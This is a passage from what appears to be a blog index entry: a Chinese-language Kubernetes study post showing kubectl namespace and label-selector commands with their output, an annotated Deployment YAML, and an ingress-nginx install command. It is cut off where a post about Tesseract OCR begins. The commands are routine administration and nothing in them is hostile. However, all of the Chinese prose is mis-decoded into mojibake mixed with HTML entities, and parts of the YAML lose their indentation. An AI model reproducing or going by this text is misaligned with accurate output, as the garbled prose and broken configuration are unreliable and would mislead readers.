(4h43m ago)   13d\ndog-dp-b6c8757d4-dts8v            2&#x2F;2     Running   6 (4h43m ago)   13d\nproductpage-v1-6b746f74dc-slrjm   2&#x2F;2     Running   6 (4h43m ago)   13d\nratings-v1-b6994bb9-pnnss         2&#x2F;2     Running   6 (4h43m ago)   13d\nreviews-v1-545db77b95-8xl8k       2&#x2F;2     Running   6 (4h43m ago)   13d\nreviews-v2-7bf8c9648f-wklnd       2&#x2F;2     Running   6 (4h43m ago)   13d\nreviews-v3-84779c7bbc-ckb87       2&#x2F;2     Running   6 (4h43m ago)   13d\nè®¾ç½®é»˜è®¤çš„å‘½åç©ºé—´ä¸ºkube-systemkubectl config set-context --current --namespace&#x3D;kube-system\n## å®é™…æ‰§è¡Œç»“æœ\n[root@k8s-master-22 ~]# kubectl config set-context --current --namespace&#x3D;kube-system\nContext &quot;kubernetes-admin@kubernetes&quot; modified.\n\t\t\t\t\t\t  \n## æŸ¥çœ‹å½“å‰å‘½åç©ºé—´\nkubectl config view --minify | grep namespace:\n## å®é™…æ‰§è¡Œç»“æœ\n[root@k8s-master-22 ~]# kubectl config view --minify | grep namespace:\nnamespace: kube-system\n## æŸ¥çœ‹pod\nkubectl get pod\n## å®é™…æ‰§è¡Œç»“æœ\n[root@k8s-master-22 ~]# kubectl get pod\nNAME                                       READY   STATUS    RESTARTS        AGE\ncalico-kube-controllers-6fd7b9848d-4zlm5   1&#x2F;1     Running   3 (4h47m ago)   13d\ncalico-node-5c694                          1&#x2F;1     Running   3 (4h47m ago)   13d\ncalico-node-qgtxj                          1&#x2F;1     Running   3 (4h47m ago)   13d\ncoredns-7f6cbbb7b8-r4px6                   1&#x2F;1     Running   3 (4h47m ago)   13d\ncoredns-7f6cbbb7b8-snbdj                   1&#x2F;1     Running   3 (4h47m ago)   13d\netcd-k8s-master-22                         1&#x2F;1     Running   4 (32m ago)     13d\nkube-apiserver-k8s-master-22               1&#x2F;1     Running   6 (32m ago)     13d\nkube-controller-manager-k8s-master-22      1&#x2F;1     Running   4 (32m ago)     13d\nkube-proxy-c964g                           1&#x2F;1     Running   3 (4h47m ago)   13d\nkube-proxy-sdqxg                           1&#x2F;1     Running   3 (4h47m ago)   13d\nkube-scheduler-k8s-master-22               1&#x2F;1     Running   4 (32m ago)     13d\n## è¿˜åŸé»˜è®¤çš„å‘½åç©ºé—´ä¸ºdefault\nkubectl config set-context --current --namespace&#x3D;default\n## æŸ¥çœ‹å½“å‰é»˜è®¤çš„å‘½åç©ºé—´\nkubectl config view --minify | grep namespace:\t\t\t\t\t\t  \n\nå‘½åç©ºé—´å’ŒDNS\nåˆ›å»ºä¸€ä¸ªæœåŠ¡(Service)ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªå¯¹åº”çš„DNSæ¡ç›®ã€‚\n\n\næ¡ç›®å½¢å¼ï¼š è¯¥æ¡ç›®çš„å½¢å¼æ˜¯ &lt;æœåŠ¡åç§°&gt;.&lt;åå­—ç©ºé—´åç§°&gt;.svc.cluster.local\nè§£æï¼šå®¹å™¨å¦‚æœåªä½¿ç”¨æœåŠ¡åï¼Œå®ƒå°†è¢«è§£æåˆ°æœ¬åœ°åå­—ç©ºé—´çš„æœåŠ¡ã€‚\n\n\nå¹¶éæ‰€æœ‰çš„å¯¹è±¡éƒ½åœ¨å‘½åç©ºé—´ä¸­\n\n\nå¤§å¤šæ•°èµ„æºéƒ½ä½äºæŸä¸ªå‘½åç©ºé—´ä¸­ã€‚\nDeployment\nPod\nService\n\n\nåº•å±‚èµ„æºä¸€èˆ¬ä¸åœ¨å‘½åç©ºé—´ä¸­\nèŠ‚ç‚¹\næŒä¹…åŒ–å·\n\n\n\n\næŸ¥çœ‹åœ¨å‘½åç©ºé—´å’Œä¸åœ¨å‘½åç©ºé—´ä¸­çš„èµ„æº# ä½äºåå­—ç©ºé—´ä¸­çš„èµ„æº\nkubectl api-resources --namespaced&#x3D;true\n\t\t\t\t\t\t  \n# ä¸åœ¨åå­—ç©ºé—´ä¸­çš„èµ„æº\nkubectl api-resources --namespaced&#x3D;false\nå®é™…çš„æ‰§è¡Œç»“æœåœ¨å‘½åç©ºé—´ä¸­çš„èµ„æº[root@k8s-master-22 ~]# kubectl api-resources --namespaced&#x3D;true\nNAME                        SHORTNAMES   APIVERSION                     NAMESPACED   KIND\nbindings                                 v1                             true         Binding\nconfigmaps                  cm           v1                             true         ConfigMap\nendpoints                   ep           v1                             true         Endpoints\nevents                      ev           v1                             true         Event\nlimitranges                 limits       v1                             true         LimitRange\npersistentvolumeclaims      pvc          v1                             true         PersistentVolumeClaim\npods                        po           v1                             true         Pod\npodtemplates                             v1                             true         PodTemplate\nreplicationcontrollers      rc           v1                             true         ReplicationController\nresourcequotas              quota        v1                             true         ResourceQuota\nsecrets                                  v1                             true         Secret\nserviceaccounts             sa           v1                             true         ServiceAccount\nservices                    svc          v1                             true         Service\ncontrollerrevisions                      apps&#x2F;v1                        true         ControllerRevision\ndaemonsets                  ds           apps&#x2F;v1                        true         DaemonSet\ndeployments                 deploy       apps&#x2F;v1                        true         Deployment\nreplicasets                 rs           apps&#x2F;v1                        true         ReplicaSet\nstatefulsets                sts          apps&#x2F;v1                        true         StatefulSet\nlocalsubjectaccessreviews                authorization.k8s.io&#x2F;v1        true         LocalSubjectAccessReview\nhorizontalpodautoscalers    hpa          autoscaling&#x2F;v1                true         \nHorizontalPodAutoscaler  cronjobs                    cj           batch&#x2F;v1                       true         \nCronJob  jobs                                     batch&#x2F;v1             true         Job\nleases                                   coordination.k8s.io&#x2F;v1         true         Lease\n networkpolicies                          crd.projectcalico.org&#x2F;v1       true         NetworkPolicy\nnetworksets                              crd.projectcalico.org&#x2F;v1       true         NetworkSet\nendpointslices                           discovery.k8s.io&#x2F;v1            true         EndpointSlice\n events                      ev           events.k8s.io&#x2F;v1               true         Event\nwasmplugins                              extensions.istio.io&#x2F;v1alpha1   true         WasmPlugin\nistiooperators              iop,io       install.istio.io&#x2F;v1alpha1      true         IstioOperator\ndestinationrules            dr           networking.istio.io&#x2F;v1beta1    true         DestinationRule\n envoyfilters                             networking.istio.io&#x2F;v1alpha3   true         EnvoyFilter\ngateways                    gw           networking.istio.io&#x2F;v1beta1    true         Gateway\nserviceentries              se           networking.istio.io&#x2F;v1beta1    true         ServiceEntry\nsidecars                                 networking.istio.io&#x2F;v1beta1    true         Sidecar\nvirtualservices             vs           networking.istio.io&#x2F;v1beta1    true         VirtualService\nworkloadentries             we           networking.istio.io&#x2F;v1beta1    true         WorkloadEntry\nworkloadgroups              wg           networking.istio.io&#x2F;v1alpha3   true         WorkloadGroup\ningresses                   ing          networking.k8s.io&#x2F;v1           true         Ingress\nnetworkpolicies             netpol       networking.k8s.io&#x2F;v1           true         NetworkPolicy\npoddisruptionbudgets        pdb          policy&#x2F;v1                      true         PodDisruptionBudget\nrolebindings                             rbac.authorization.k8s.io&#x2F;v1   true         RoleBinding\nroles                                    rbac.authorization.k8s.io&#x2F;v1   true         Role\nauthorizationpolicies                    security.istio.io&#x2F;v1beta1      true         AuthorizationPolicy\npeerauthentications         pa           security.istio.io&#x2F;v1beta1      true         PeerAuthentication\nrequestauthentications      ra           security.istio.io&#x2F;v1beta1      true         RequestAuthentication\ncsistoragecapacities                     storage.k8s.io&#x2F;v1beta1         true         CSIStorageCapacity\ntelemetries                 telemetry    telemetry.istio.io&#x2F;v1alpha1    true         Telemetry\nä¸åœ¨å‘½åç©ºé—´ä¸­çš„èµ„æº[root@k8s-master-22 ~]# kubectl api-resources --namespaced&#x3D;false\nNAME      SHORTNAMES   APIVERSION        NAMESPACED   KIND\ncomponentstatuses                 cs           v1                                     false        ComponentStatus\nnamespaces                        ns           v1                                     false        Namespace\nnodes                             no           v1                                     false        Node\npersistentvolumes                 pv           v1                                     false        PersistentVolume\nmutatingwebhookconfigurations                  admissionregistration.k8s.io&#x2F;v1        false        MutatingWebhookConfiguration\nvalidatingwebhookconfigurations                admissionregistration.k8s.io&#x2F;v1        false        ValidatingWebhookConfiguration\ncustomresourcedefinitions         crd,crds     apiextensions.k8s.io&#x2F;v1                false        CustomResourceDefinition\napiservices                                    apiregistration.k8s.io&#x2F;v1              false        APIService\n tokenreviews                                   authentication.k8s.io&#x2F;v1               false        TokenReview\nselfsubjectaccessreviews                       authorization.k8s.io&#x2F;v1                false        SelfSubjectAccessReview\nselfsubjectrulesreviews                        authorization.k8s.io&#x2F;v1                false        SelfSubjectRulesReview\nsubjectaccessreviews                           authorization.k8s.io&#x2F;v1                false        SubjectAccessReview\ncertificatesigningrequests        csr          certificates.k8s.io&#x2F;v1                 false        CertificateSigningRequest\nbgpconfigurations                              crd.projectcalico.org&#x2F;v1               false        BGPConfiguration\nbgppeers                                       crd.projectcalico.org&#x2F;v1               false        BGPPeer\nblockaffinities                                crd.projectcalico.org&#x2F;v1               false        BlockAffinity\ncaliconodestatuses                             crd.projectcalico.org&#x2F;v1               false        CalicoNodeStatus\nclusterinformations                            crd.projectcalico.org&#x2F;v1               false        ClusterInformation\nfelixconfigurations                            crd.projectcalico.org&#x2F;v1               false        FelixConfiguration\nglobalnetworkpolicies                          crd.projectcalico.org&#x2F;v1               false        GlobalNetworkPolicy\nglobalnetworksets                              crd.projectcalico.org&#x2F;v1               false        GlobalNetworkSet\nhostendpoints                                  crd.projectcalico.org&#x2F;v1               false        HostEndpoint\nipamblocks                                     crd.projectcalico.org&#x2F;v1               false        IPAMBlock\nipamconfigs                                    crd.projectcalico.org&#x2F;v1               false        IPAMConfig\nipamhandles                                    crd.projectcalico.org&#x2F;v1               false        IPAMHandle\nippools                                        crd.projectcalico.org&#x2F;v1               false        IPPool\nipreservations                                 crd.projectcalico.org&#x2F;v1               false        IPReservation\nkubecontrollersconfigurations                  crd.projectcalico.org&#x2F;v1               false        KubeControllersConfiguration\nflowschemas                                    flowcontrol.apiserver.k8s.io&#x2F;v1beta1   false        FlowSchema\nprioritylevelconfigurations                    flowcontrol.apiserver.k8s.io&#x2F;v1beta1   false        PriorityLevelConfiguration\ningressclasses                                 networking.k8s.io&#x2F;v1                   false        IngressClass\nruntimeclasses                                 node.k8s.io&#x2F;v1                         false        RuntimeClass\npodsecuritypolicies               psp          policy&#x2F;v1beta1                         false        PodSecurityPolicy\nclusterrolebindings                            rbac.authorization.k8s.io&#x2F;v1           false        ClusterRoleBinding\nclusterroles                                   rbac.authorization.k8s.io&#x2F;v1           false        ClusterRole\npriorityclasses                   pc           scheduling.k8s.io&#x2F;v1                   false        PriorityClass\ncsidrivers                                     storage.k8s.io&#x2F;v1                      false        CSIDriver\ncsinodes                                       storage.k8s.io&#x2F;v1                      false        CSINode\nstorageclasses                    sc           storage.k8s.io&#x2F;v1                      false        StorageClass\nvolumeattachments                              storage.k8s.io&#x2F;v1                      false        VolumeAttachment\n\nè‡ªåŠ¨æ‰“æ ‡ç­¾Kubernetes æ§åˆ¶é¢ä¼šä¸ºæ‰€æœ‰å‘½åç©ºé—´è®¾ç½®ä¸€ä¸ªä¸å¯å˜æ›´çš„ æ ‡ç­¾ kubernetes.io/metadata.nameï¼Œåªè¦ NamespaceDefaultLabelName è¿™ä¸€ ç‰¹æ€§è¢«å¯ç”¨ã€‚æ ‡ç­¾çš„å€¼æ˜¯åå­—ç©ºé—´çš„åç§°ã€‚\næ ‡ç­¾å’Œé€‰æ‹©ç®—ç¬¦å®˜æ–¹æ–‡æ¡£\nä»‹ç»ä½œç”¨èŒƒå›´ï¼šé™„åŠ åˆ°Kuberneteså¯¹è±¡ï¼Œä¾‹å¦‚Podsï¼ŒDeploymentç­‰ã€‚\nç”¨é€”\nå¯¹ç”¨æˆ·æœ‰æ„ä¹‰ã€‚\nä¸ç›´æ¥å¯¹æ ¸å¿ƒç³»ç»Ÿæœ‰è¯­ä¹‰å«ä¹‰ã€‚\nç”¨äºç»„åˆå’Œé€‰æ‹©å¯¹è±¡çš„å­é›†ã€‚\n\nè§„èŒƒ\næ¯ä¸ªå¯¹è±¡å¯ä»¥å®šä¹‰ä¸€ç»„å»º&#x2F;å€¼æ ‡ç­¾ã€‚\næ¯ä¸ªå»ºå¯¹äºç»™å®šçš„å¯¹è±¡å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚\n\nåŠ¨æœº\næ ‡ç­¾ä½¿ç”¨æˆ·èƒ½å¤Ÿä»¥æ¾æ•£è€¦åˆçš„æ–¹å¼å°†ä»–ä»¬è‡ªå·±çš„ç»„ç»‡ç»“æ„æ˜ å°„åˆ°ç³»ç»Ÿå¯¹è±¡ï¼Œè€Œæ— éœ€å®¢æˆ·ç«¯å­˜å‚¨è¿™äº›æ˜ å°„ã€‚  å³å¯ä»¥åŠ¨æ€çš„ï¼ŒæŒ‰ç…§å®¢æˆ·çš„è¦æ±‚æ¥ç»„ç»‡å¯¹è±¡çš„é›†åˆï¼Œè€Œéå›ºå®šçš„è®°å½•å¯¹è±¡é›†åˆã€‚\næœåŠ¡éƒ¨ç½²å’Œæ‰¹å¤„ç†æµæ°´çº¿é€šå¸¸æ˜¯å¤šç»´å®ä½“ï¼ˆä¾‹å¦‚ï¼Œå¤šä¸ªåˆ†åŒºæˆ–éƒ¨ç½²ã€å¤šä¸ªå‘è¡Œåºåˆ—ã€å¤šä¸ªå±‚ï¼Œæ¯å±‚å¤šä¸ªå¾®æœåŠ¡ï¼‰ã€‚\n\nç¤ºä¾‹æ ‡ç­¾&quot;release&quot; : &quot;stable&quot;, &quot;release&quot; : &quot;canary&quot;\n&quot;environment&quot; : &quot;dev&quot;, &quot;environment&quot; : &quot;qa&quot;, &quot;environment&quot; : &quot;production&quot;\n&quot;tier&quot; : &quot;frontend&quot;, &quot;tier&quot; : &quot;backend&quot;, &quot;tier&quot; : &quot;cache&quot;\n&quot;partition&quot; : &quot;customerA&quot;, &quot;partition&quot; : &quot;customerB&quot;\n&quot;track&quot; : &quot;daily&quot;, &quot;track&quot; : &quot;weekly&quot;\nè¯­æ³•å’Œå­—ç¬¦é›† æ ‡ç­¾ æ˜¯é”®å€¼å¯¹ã€‚æœ‰æ•ˆçš„æ ‡ç­¾é”®æœ‰ä¸¤ä¸ªæ®µï¼šå¯é€‰çš„å‰ç¼€å’Œåç§°ï¼Œç”¨æ–œæ ï¼ˆ&#x2F;ï¼‰åˆ†éš”ã€‚ åç§°æ®µæ˜¯å¿…éœ€çš„ï¼Œå¿…é¡»å°äºç­‰äº 63 ä¸ªå­—ç¬¦ï¼Œä»¥å­—æ¯æ•°å­—å­—ç¬¦ï¼ˆ[a-z0-9A-Z]ï¼‰å¼€å¤´å’Œç»“å°¾ï¼Œ å¸¦æœ‰ç ´æŠ˜å·ï¼ˆ-ï¼‰ï¼Œä¸‹åˆ’çº¿ï¼ˆ_ï¼‰ï¼Œç‚¹ï¼ˆ .ï¼‰å’Œä¹‹é—´çš„å­—æ¯æ•°å­—ã€‚ å‰ç¼€æ˜¯å¯é€‰çš„ã€‚å¦‚æœæŒ‡å®šï¼Œå‰ç¼€å¿…é¡»æ˜¯ DNS å­åŸŸï¼šç”±ç‚¹ï¼ˆ.ï¼‰åˆ†éš”çš„ä¸€ç³»åˆ— DNS æ ‡ç­¾ï¼Œæ€»å…±ä¸è¶…è¿‡ 253 ä¸ªå­—ç¬¦ï¼Œ åè·Ÿæ–œæ ï¼ˆ&#x2F;ï¼‰ã€‚kubernetes.io&#x2F; å’Œ k8s.io&#x2F; å‰ç¼€æ˜¯ä¸º Kubernetes æ ¸å¿ƒç»„ä»¶ä¿ç•™çš„ã€‚\næœ‰æ•ˆæ ‡ç­¾å€¼ï¼šå¿…é¡»ä¸º 63 ä¸ªå­—ç¬¦æˆ–æ›´å°‘ï¼ˆå¯ä»¥ä¸ºç©ºï¼‰                              é™¤éæ ‡ç­¾å€¼ä¸ºç©ºï¼Œå¿…é¡»ä»¥å­—æ¯æ•°å­—å­—ç¬¦ï¼ˆ[a-z0-9A-Z]ï¼‰å¼€å¤´å’Œç»“å°¾                              åŒ…å«ç ´æŠ˜å·ï¼ˆ-ï¼‰ã€ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰ã€ç‚¹ï¼ˆ.ï¼‰å’Œå­—æ¯æˆ–æ•°å­—ã€‚\næ ‡ç­¾é€‰æ‹©ç®—ç¬¦åŸºäºç­‰å€¼çš„éœ€æ±‚-ç­‰äºkubectl get pod -l app&#x3D;cat\nä¸ç­‰äºkubectl get pod -l app!&#x3D;cat\nåŸºäºé›†åˆçš„éœ€æ±‚-in ## é€‰å–catå’Œdog\nkubectl get pod -l &quot;app in (cat,dog)&quot;\n\t\t\t\t\t\t\t\t  \n## å®é™…æ‰§è¡Œç»“æœ\n[root@k8s-master-22 deployment]# kubectl get pod -l &quot;app in (cat,dog)&quot;\nNAME                      READY   STATUS    RESTARTS   AGE\ncat-dp-58cf7df488-dcs4g   2&#x2F;2     Running   0          25m\ncat-dp-58cf7df488-hk4fb   2&#x2F;2     Running   0          26m\ndog-dp-b6c8757d4-t5vnv    2&#x2F;2     Running   0          26m\nåŸºäºé›†åˆçš„éœ€æ±‚- notin ## é€‰å–écatï¼Œédog\nkubectl get pod -l &quot;app notin (cat,dog)&quot;\n\t\t\t\t\t\t\t\t  \n## å®é™…æ‰§è¡Œç»“æœ\n[root@k8s-master-22 deployment]# kubectl get pod -l &quot;app notin (cat,dog)&quot;\nNAME                              READY   STATUS    RESTARTS         AGE\ndetails-v1-79f774bdb9-jd7tv       2&#x2F;2     Running   12 (3h59m ago)   13d\nmonkey-dp-65686cb678-pvk87        2&#x2F;2     Running   0                7m17s\nproductpage-v1-6b746f74dc-slrjm   2&#x2F;2     Running   12 (3h59m ago)   13d\nratings-v1-b6994bb9-pnnss         2&#x2F;2     Running   12 (3h58m ago)   13d\nreviews-v1-545db77b95-8xl8k       2&#x2F;2     Running   12 (3h59m ago)   13d\nreviews-v2-7bf8c9648f-wklnd       2&#x2F;2     Running   12 (3h59m ago)   13d\nreviews-v3-84779c7bbc-ckb87       2&#x2F;2     Running   12 (3h59m ago)   13d\nåŸºäºé›†åˆçš„éœ€æ±‚- exist## é€‰å–å­˜åœ¨envæ ‡ç­¾çš„pod\nkubectl get pod -l env\n ## æ‰§è¡Œç»“æœ\n[root@k8s-master-22 deployment]# kubectl get pod -l env\nNAME                         READY   STATUS    RESTARTS   AGE\ncat-dp-58cf7df488-dcs4g      2&#x2F;2     Running   0          54m\ncat-dp-58cf7df488-hk4fb      2&#x2F;2     Running   0          55m\ndog-dp-b6c8757d4-t5vnv       2&#x2F;2     Running   0          55m\nmonkey-dp-65686cb678-pvk87   2&#x2F;2     Running   0          35m\n[root@k8s-master-22 deployment]#\n## é€‰å–ä¸å­˜åœ¨envæ ‡ç­¾çš„pod\nkubectl get pod -l &quot;! env&quot;\n## å®é™…æ‰§è¡Œç»“æœ\n[root@k8s-master-22 deployment]# kubectl get pod -l &quot;! env&quot;\nNAME                              READY   STATUS    RESTARTS       AGE\ndetails-v1-79f774bdb9-jd7tv       2&#x2F;2     Running   26 (15h ago)   15d\nproductpage-v1-6b746f74dc-slrjm   2&#x2F;2     Running   26 (15h ago)   15d\nratings-v1-b6994bb9-pnnss         2&#x2F;2     Running   26 (15h ago)   15d\nreviews-v1-545db77b95-8xl8k       2&#x2F;2     Running   26 (15h ago)   15d\nreviews-v2-7bf8c9648f-wklnd       2&#x2F;2     Running   26 (15h ago)   15d\nreviews-v3-84779c7bbc-ckb87       2&#x2F;2     Running   26 (15h ago)   15d\nåŸºäºé›†åˆçš„éœ€æ±‚å¤šæ¡ä»¶&amp;&amp;## é€‰å–app&#x3D;catå¹¶ä¸”env&#x3D;prodçš„pod\nkubectl get pod -l app&#x3D;cat,env&#x3D;prod\n## å®é™…æ‰§è¡Œç»“æœ\n[root@k8s-master-22 deployment]# kubectl get pod -l app&#x3D;cat,env&#x3D;prod\nNAME                          READY   STATUS    RESTARTS   AGE\ncat-dp-prod-7b4c9b4f8-6wrh8   2&#x2F;2     Running   0          73s\ncat-dp-prod-7b4c9b4f8-8k7hf   2&#x2F;2     Running   0          73s\n## é€‰å–ä¸å¸¦envæ ‡ç­¾çš„pod\nkubectl get pod -l &quot;! env&quot;\n## å®é™…æ‰§è¡Œç»“æœ\n[root@k8s-master-22 deployment]# kubectl get pod -l &quot;! env&quot;\nNAME                              READY   STATUS    RESTARTS         AGE\ndetails-v1-79f774bdb9-jd7tv       2&#x2F;2     Running   12 (4h50m ago)   13d\nproductpage-v1-6b746f74dc-slrjm   2&#x2F;2     Running   12 (4h50m ago)   13d\nratings-v1-b6994bb9-pnnss         2&#x2F;2     Running   12 (4h49m ago)   13d\nreviews-v1-545db77b95-8xl8k       2&#x2F;2     Running   12 (4h50m ago)   13d\nreviews-v2-7bf8c9648f-wklnd       2&#x2F;2     Running   12 (4h50m ago)   13d\nreviews-v3-84779c7bbc-ckb87       2&#x2F;2     Running   12 (4h50m ago)   13d\nAPILISTå’ŒWATCHè¿‡æ»¤åœ¨APIå¯¹è±¡ä¸­è®¾ç½®å¼•ç”¨\n\nServiceå’ŒReplicationController\næ”¯æŒåŸºäºé›†åˆéœ€æ±‚çš„èµ„æº\né€‰æ‹©èŠ‚ç‚¹é›†å®˜æ–¹æ–‡æ¡£\n\nä¸ºå¯¹è±¡é™„åŠ å…ƒæ•°æ®## ä¾‹å¦‚\nannotations:\nauthor: catface996\n## åœ¨cat-dp-gray.yaml ä¸­é…ç½®    \n[root@k8s-master-22 deployment]# cat cat-dp-gray.yaml\napiVersion: apps&#x2F;v1\nkind: Deployment\nmetadata:\nname: cat-dp-gray\nannotations:\nauthor: catface996\n\tspec:\n\tselector:\n\tmatchLabels:\n\tapp: cat\n\t\tenv: gray\n\t\t\t\t\t    replicas: 2\n\t\t\t\t\t    template:\n\t\t\t\t\t      metadata:\n\t\t\t\t\t        labels:\n\t\t\t\t\t          app: cat\n\t\t\t\t\t          env: gray\n\t\t\t\t\t      spec:\n\t\t\t\t\t        containers:\n\t\t\t\t\t          - name: cat-ct-gray\n\t\t\t\t\t            image: catface996&#x2F;spring-cloud-istio-demo:latest\n\t\t\t\t\t            ports:\n\t\t\t\t\t              - containerPort: 9001\n\t\t\t\t\t                protocol: TCP\n\t\t\t\t\t                \n## é…ç½®ç”Ÿæ•ˆå\n[root@k8s-master-22 deployment]# kubectl describe deployment cat-dp-gray\nName:                   cat-dp-gray\nNamespace:              default\nCreationTimestamp:      Mon, 25 Apr 2022 08:15:44 -0400\nLabels:                 &lt;none&gt;\nAnnotations:            author: catface99\ndeployment.kubernetes.io&#x2F;revision: 1\n\t\t\t\t\t  Selector:               app&#x3D;cat,env&#x3D;gray\n\t\t\t\t\t  Replicas:               2 desired | 2 updated | 2 total | 2 available | 0 unavailable\n\t\t\t\t\t  StrategyType:           RollingUpdate\n\t\t\t\t\t  MinReadySeconds:        0\n\t\t\t\t\t  RollingUpdateStrategy:  25% max unavailable, 25% max surge\n\t\t\t\t\t  Pod Template:\n\t\t\t\t\t    Labels:  app&#x3D;cat\n\t\t\t\t\t             env&#x3D;gray\n\t\t\t\t\t    Containers:\n\t\t\t\t\t     cat-ct-gray:\n\t\t\t\t\t      Image:        catface996&#x2F;spring-cloud-istio-demo:latest\n\t\t\t\t\t      Port:         9001&#x2F;TCP\n\t\t\t\t\t      Host Port:    0&#x2F;TCP\n\t\t\t\t\t      Environment:  &lt;none&gt;\n\t\t\t\t\t      Mounts:       &lt;none&gt;\n\t\t\t\t\t    Volumes:        &lt;none&gt;\n\t\t\t\t\t  Conditions:\n\t\t\t\t\t    Type           Status  Reason\n\t\t\t\t\t    ----           ------  ------\n\t\t\t\t\t    Progressing    True    NewReplicaSetAvailable\n\t\t\t\t\t    Available      True    MinimumReplicasAvailable\n\t\t\t\t\t  OldReplicaSets:  &lt;none&gt;\n\t\t\t\t\t  NewReplicaSet:   cat-dp-gray-79545bc67d (2&#x2F;2 replicas created)\n\t\t\t\t\t  Events:\n\t\t\t\t\t    Type    Reason             Age   From                   Message\n\t\t\t\t\t    ----    ------             ----  ----                   -------\n\t\t\t\t\t    Normal  ScalingReplicaSet  24m   deployment-controller  Scaled up replica set cat-dp-gray-79545bc67d to 2\n\t\t\t\t\t                \nå¸¸ç”¨çš„ä¾‹å­ç”±å£°æ˜æ€§é…ç½®æ‰€ç®¡ç†çš„å­—æ®µã€‚ å°†è¿™äº›å­—æ®µé™„åŠ ä¸ºæ³¨è§£ï¼Œèƒ½å¤Ÿå°†å®ƒä»¬ä¸å®¢æˆ·ç«¯æˆ–æœåŠ¡ç«¯è®¾ç½®çš„é»˜è®¤å€¼ã€ è‡ªåŠ¨ç”Ÿæˆçš„å­—æ®µä»¥åŠé€šè¿‡è‡ªåŠ¨è°ƒæ•´å¤§å°æˆ–è‡ªåŠ¨ä¼¸ç¼©ç³»ç»Ÿè®¾ç½®çš„å­—æ®µåŒºåˆ†å¼€æ¥ã€‚\n\næ„å»ºã€å‘å¸ƒæˆ–é•œåƒä¿¡æ¯ï¼ˆå¦‚æ—¶é—´æˆ³ã€å‘å¸ƒ IDã€Git åˆ†æ”¯ã€PR æ•°é‡ã€é•œåƒå“ˆå¸Œã€ä»“åº“åœ°å€ï¼‰ã€‚\næŒ‡å‘æ—¥å¿—è®°å½•ã€ç›‘æ§ã€åˆ†ææˆ–å®¡è®¡ä»“åº“çš„æŒ‡é’ˆã€‚\nå¯ç”¨äºè°ƒè¯•ç›®çš„çš„å®¢æˆ·ç«¯åº“æˆ–å·¥å…·ä¿¡æ¯ï¼šä¾‹å¦‚ï¼Œåç§°ã€ç‰ˆæœ¬å’Œæ„å»ºä¿¡æ¯ã€‚\nç”¨æˆ·æˆ–è€…å·¥å…·&#x2F;ç³»ç»Ÿçš„æ¥æºä¿¡æ¯ï¼Œä¾‹å¦‚æ¥è‡ªå…¶ä»–ç”Ÿæ€ç³»ç»Ÿç»„ä»¶çš„ç›¸å…³å¯¹è±¡çš„ URLã€‚\nè½»é‡çº§ä¸Šçº¿å·¥å…·çš„å…ƒæ•°æ®ä¿¡æ¯ï¼šä¾‹å¦‚ï¼Œé…ç½®æˆ–æ£€æŸ¥ç‚¹ã€‚\nè´Ÿè´£äººå‘˜çš„ç”µè¯æˆ–å‘¼æœºå·ç ï¼Œæˆ–æŒ‡å®šåœ¨ä½•å¤„å¯ä»¥æ‰¾åˆ°è¯¥ä¿¡æ¯çš„ç›®å½•æ¡ç›®ï¼Œå¦‚å›¢é˜Ÿç½‘ç«™ã€‚ ä»ç”¨æˆ·åˆ°æœ€ç»ˆè¿è¡Œçš„æŒ‡ä»¤ï¼Œä»¥ä¿®æ”¹è¡Œä¸ºæˆ–ä½¿ç”¨éæ ‡å‡†åŠŸèƒ½ã€‚\n\nè¯­æ³•å’Œå­—ç¬¦é›†æ³¨æ„ï¼š kubernetes.io&#x2F; å’Œ k8s.io&#x2F; å‰ç¼€æ˜¯ä¸ºKubernetesæ ¸å¿ƒç»„ä»¶ä¿ç•™çš„ã€‚\nFinalizers å®˜æ–¹æ–‡æ¡£\nå­—æ®µé€‰æ‹©å™¨ å®˜æ–¹æ–‡æ¡£\nå±ä¸»ä¸é™„å± å®˜æ–¹æ–‡æ¡£\næ¨èä½¿ç”¨çš„æ ‡ç­¾å®˜æ–¹æ–‡æ¡£\nKubernetesæ¶æ„\nå®¹å™¨\nå·¥ä½œè´Ÿè½½\næœåŠ¡ã€è´Ÿè½½å‡è¡¡å’Œè”ç½‘å®˜æ–¹æ–‡æ¡£  - Ingress Ingress nginx\n\néƒ¨ç½²å‘½ä»¤ï¼škubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;kubernetes&#x2F;ingress-nginx&#x2F;controller-v1.2.0&#x2F;deploy&#x2F;static&#x2F;provider&#x2F;cloud&#x2F;deploy.yaml\nä½¿ç”¨åˆ°çš„é•œåƒ k8s.gcr.io&#x2F;ingress-nginx&#x2F;controller:v1.2.0\n k8s.gcr.io&#x2F;ingress-nginx&#x2F;kube-webhook-certgen:v1.1.1\nregistry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;nginx-ingress-controller:v1.2.0\nregistry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;kube-webhook-certgen:v1.1.1\n\nIngressæ§åˆ¶å™¨\nå­˜å‚¨\né…ç½®\nå®‰å…¨\nç­–ç•¥\nè°ƒåº¦ï¼ŒæŠ¢å å’Œé©±é€\nå®˜æ–¹æ–‡æ¡£\nå°†PodsæŒ‡æ´¾åˆ°èŠ‚ç‚¹\n\n\né›†ç¾¤ç®¡ç†\næ‰©å±•Kubernetes\nä»»åŠ¡\nå®˜æ–¹æ–‡æ¡£\nè¿è¡Œåº”ç”¨\nå®˜æ–¹æ–‡æ¡£\nPod æ°´å¹³è‡ªåŠ¨æ‰©ç¼©\nå®˜æ–¹æ–‡æ¡£\n\n\n\n\n\n\n\n","slug":"k8såˆ†å¸ƒå¼ç³»ç»Ÿè§†è§’ä¸‹é‡æ–°å­¦ä¹ ","date":"2022-10-25T01:27:40.674Z","categories_index":"Cloud-Native","tags_index":"åˆ†å¸ƒå¼ç³»ç»Ÿ,k8s","author_index":"Moses"},{"id":"6787fb34a82f7c2a73dcf3247259afae","title":"åˆè¯†Tesseract","content":"Tesseract0x01ç®€ä»‹tesseROCræ˜¯Pythonçš„ä¸€ä¸ªOCRè¯†åˆ«åº“ï¼Œä½†å…¶å®æ˜¯å¯¹tesseractåšäº†ä¸€å±‚Python Apiçš„å°è£…ï¼Œ æ ¸å¿ƒè¿˜æ˜¯tesseractï¼Œæ‰€ä»¥åœ¨å®‰è£…tesseROCrä¹‹å‰ï¼Œéœ€è¦å…ˆå®‰è£…tesseract;Introduction | 